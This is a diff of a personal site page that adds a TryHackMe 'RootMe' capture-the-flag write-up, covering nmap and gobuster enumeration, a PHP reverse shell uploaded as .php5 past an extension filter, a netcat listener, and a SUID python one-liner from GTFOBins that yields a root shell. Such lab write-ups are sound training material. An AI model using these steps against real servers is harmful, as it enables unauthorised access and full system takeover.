@@ -66,18 +66,20 @@
   <meta property="og:url" content="http://localhost:1313/writeups/tryhackme/rootme/">
   <meta property="og:site_name" content="Sonam">
   <meta property="og:title" content="RootMe">
-  <meta property="og:description" content="I&#39;m Sonam a Security Researcher, Penetration Tester &amp; AppSec Nerd. Working in network pentest and web-app hacking.">
+  <meta property="og:description" content="in this challenge we have to perform enumeration to get shell and escalate the root privilege.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2025-01-27T00:00:00+00:00">
     <meta property="article:modified_time" content="2025-01-27T00:00:00+00:00">
     <meta property="article:tag" content="Tryhackme">
+    <meta property="og:image" content="http://localhost:1313/writeups/tryhackme/rootme/features.png">
 
   
-  <meta name="twitter:card" content="summary">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/writeups/tryhackme/rootme/features.png">
   <meta name="twitter:title" content="RootMe">
-  <meta name="twitter:description" content="I&#39;m Sonam a Security Researcher, Penetration Tester &amp; AppSec Nerd. Working in network pentest and web-app hacking.">
+  <meta name="twitter:description" content="in this challenge we have to perform enumeration to get shell and escalate the root privilege.">
 
   
   <script type="application/ld+json">
@@ -88,7 +90,7 @@
     "name": "RootMe",
     "headline": "RootMe",
     
-    
+    "abstract": "in this challenge we have to perform enumeration to get shell and escalate the root privilege.",
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/writeups\/tryhackme\/rootme\/",
     "author" : {
@@ -104,7 +106,7 @@
     "keywords": ["Tryhackme"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "0"
+    "wordCount": "555"
   }]
   </script>
 
@@ -450,9 +452,33 @@
   
   
   
- 
 
 
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/writeups/tryhackme/rootme/features_hu6822584357486402000.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
 
   
   
@@ -530,7 +556,11 @@
 
 
 
+  
 
+
+
+  
 
 
 
@@ -549,7 +579,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  
+  <span>555 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.63c8a202661f4a2063fdc2706685d668e8ea3da613da2224e9da527e5876e4f53dcac39ab60732626fb4151feae5d430d0cf44731e5d3c726522fcc1519c1547.js" integrity="sha512-Y8iiAmYfSiBj/cJwZoXWaOjqPaYT2iIk6dpSflh25PU9ysOatgcyYm&#43;0FR/q5dQw0M9Ecx5dPHJlIvzBUZwVRw=="></script>
@@ -727,7 +757,275 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          
+          <p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-1_hu11308698393154641996.png 330w,
+        /writeups/tryhackme/rootme/image-1_hu18230198800788777320.png 660w,
+        /writeups/tryhackme/rootme/image-1_hu5265259566146205305.png 1024w,
+        /writeups/tryhackme/rootme/image-1_hu11151531220056255959.png 2x"
+        src="/writeups/tryhackme/rootme/image-1_hu18230198800788777320.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+in this challenge we have to perform enumeration to get shell and escalate the root privilege.let&rsquo;s deploy the machine.</p>
+<p>I started network scanning with nmap to see what services are running on the machine.i used
+<code>nmap -sVC &lt;ipaddress&gt; &gt; nmapscan.txt</code> command to write the output in nmapscan.txt file for safety of information.</p>
+<p>this is what i got in nmap scan :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-24 14:30 +0545
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.24.36
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.20s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: HackIT - Home
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.13 seconds
+</span></span></code></pre></div><p>We can see two ports, port 22 and port 80 are running ssh and http services respectively. I visit on port 80 to see what&rsquo;s running on the web server.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-2_hu2540026734671537223.png 330w,
+        /writeups/tryhackme/rootme/image-2_hu13626166127043390956.png 660w,
+        /writeups/tryhackme/rootme/image-2_hu13688810664983084749.png 1024w,
+        /writeups/tryhackme/rootme/image-2_hu1289840499435566864.png 2x"
+        src="/writeups/tryhackme/rootme/image-2_hu13626166127043390956.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>second step , we are going to use gobuster for the directory busting to find the directories on the web server.</p>
+<pre tabindex="0"><code>┌──(cybercena㉿astra)-[~/tryhackme/rootme]
+└─$ gobuster dir -u http://10.10.107.17:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.107.17:80
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 314] [--&gt; http://10.10.107.17/uploads/]
+/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.107.17/css/]
+/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.107.17/js/]
+/panel                (Status: 301) [Size: 312] [--&gt; http://10.10.107.17/panel/]
+</code></pre><p>i visit the <code>/panel</code> directory and got the file uploading options.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-3_hu17019893695869402011.png 330w,
+        /writeups/tryhackme/rootme/image-3_hu1650211744462947878.png 660w,
+        /writeups/tryhackme/rootme/image-3_hu8088319239103290797.png 1024w,
+        /writeups/tryhackme/rootme/image-3_hu7912564708428160260.png 2x"
+        src="/writeups/tryhackme/rootme/image-3_hu1650211744462947878.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>i try to upload the php PentestMonkey reverse shell payload from <code>revshells.com</code> but the site doesn&rsquo;t allow the file with <code>.php</code> so i change file extension to <code>.php5</code> and it allow me to upload it.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-5_hu10601918087101618455.png 330w,
+        /writeups/tryhackme/rootme/image-5_hu18048912620175225401.png 660w,
+        /writeups/tryhackme/rootme/image-5_hu3800103199536411001.png 1024w,
+        /writeups/tryhackme/rootme/image-5_hu15624746288270868524.png 2x"
+        src="/writeups/tryhackme/rootme/image-5_hu18048912620175225401.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+after successfull upload of the payload i run netcat on my machine to listen the shell using <code>nc -lnvp 1234</code>.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-6_hu9958248900982643450.png 330w,
+        /writeups/tryhackme/rootme/image-6_hu14713364936303984384.png 660w,
+        /writeups/tryhackme/rootme/image-6_hu16902609432521552458.png 1024w,
+        /writeups/tryhackme/rootme/image-6_hu16538585547329409047.png 2x"
+        src="/writeups/tryhackme/rootme/image-6_hu14713364936303984384.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-7_hu11623814805432629408.png 330w,
+        /writeups/tryhackme/rootme/image-7_hu8554664057025346645.png 660w,
+        /writeups/tryhackme/rootme/image-7_hu9628425369453220754.png 1024w,
+        /writeups/tryhackme/rootme/image-7_hu11710302612273982236.png 2x"
+        src="/writeups/tryhackme/rootme/image-7_hu8554664057025346645.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+after uploading <code>rev.php5</code> payload and listen using netcat on my machine i visit <code>/uploads/rev.php5</code> i got the shell.let&rsquo;s have a linux tour now.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-8_hu9600723178680567380.png 330w,
+        /writeups/tryhackme/rootme/image-8_hu11604259726482974097.png 660w,
+        /writeups/tryhackme/rootme/image-8_hu7758783321079401736.png 1024w,
+        /writeups/tryhackme/rootme/image-8_hu2755912406488590769.png 2x"
+        src="/writeups/tryhackme/rootme/image-8_hu11604259726482974097.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>we have to find <code>user.txt</code> file but we don&rsquo;t know where it locate so i tried <code> find / - type f -name user.txt</code> and got the user.txt file inside <code>/var/www/</code>.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-9_hu11935075199695057770.png 330w,
+        /writeups/tryhackme/rootme/image-9_hu17205272402943965285.png 660w,
+        /writeups/tryhackme/rootme/image-9_hu8758342232288885009.png 1024w,
+        /writeups/tryhackme/rootme/image-9_hu12661866103619638730.png 2x"
+        src="/writeups/tryhackme/rootme/image-9_hu17205272402943965285.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+i read the user.txt file using <code>cat /var/www/user.txt</code> and got the user flag.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-10_hu1595270970195429807.png 330w,
+        /writeups/tryhackme/rootme/image-10_hu10195473836915227428.png 660w,
+        /writeups/tryhackme/rootme/image-10_hu5977320204830854530.png 1024w,
+        /writeups/tryhackme/rootme/image-10_hu7217562052604636820.png 2x"
+        src="/writeups/tryhackme/rootme/image-10_hu10195473836915227428.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>now we have to escalate the root privilege.even the question have suggest us to search for files with SUID permission.<code>find / -type f -user root -perm -4000 2&gt;/dev/null</code> commands helps us to find it.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-11_hu4141172308006897547.png 330w,
+        /writeups/tryhackme/rootme/image-11_hu11520559070754329494.png 660w,
+        /writeups/tryhackme/rootme/image-11_hu12149647421785729743.png 1024w,
+        /writeups/tryhackme/rootme/image-11_hu12310209550098313066.png 2x"
+        src="/writeups/tryhackme/rootme/image-11_hu11520559070754329494.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+we can use python for pri-esc let&rsquo;s visit <a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a> and search python we can see the functions that python can run.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-12_hu15821580656782489796.png 330w,
+        /writeups/tryhackme/rootme/image-12_hu5532533141041446969.png 660w,
+        /writeups/tryhackme/rootme/image-12_hu15065353085635501894.png 1024w,
+        /writeups/tryhackme/rootme/image-12_hu17407460758503155617.png 2x"
+        src="/writeups/tryhackme/rootme/image-12_hu5532533141041446969.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>lets paste this command into the shell and run it. we got the root shell.</p>
+<pre tabindex="0"><code>python -c &#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;
+</code></pre><p>we got the shell lets check the username using <code>whomai</code> command.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-13_hu18156646770137101705.png 330w,
+        /writeups/tryhackme/rootme/image-13_hu9037427522869676408.png 660w,
+        /writeups/tryhackme/rootme/image-13_hu1027946091191846832.png 1024w,
+        /writeups/tryhackme/rootme/image-13_hu11864119714313737678.png 2x"
+        src="/writeups/tryhackme/rootme/image-13_hu9037427522869676408.png"
+        alt="alt text"
+      />
+      
+    </figure>
+
+now we are root and the flag lies in <code>/root/root.txt</code>
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/rootme/image-14_hu1517623721521626816.png 330w,
+        /writeups/tryhackme/rootme/image-14_hu17848752295232046118.png 660w,
+        /writeups/tryhackme/rootme/image-14_hu13941988826158217795.png 1024w,
+        /writeups/tryhackme/rootme/image-14_hu12525925842900470626.png 2x"
+        src="/writeups/tryhackme/rootme/image-14_hu17848752295232046118.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>[Note : other small questions can be answered using the scan result of nmap and gobuster that we have done before]</p>
+
         </div>
         
         
@@ -864,7 +1162,13 @@
   </footer>
 </article>
 
-      
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
     </main><footer id="site-footer" class="py-10 print:hidden">
   
   
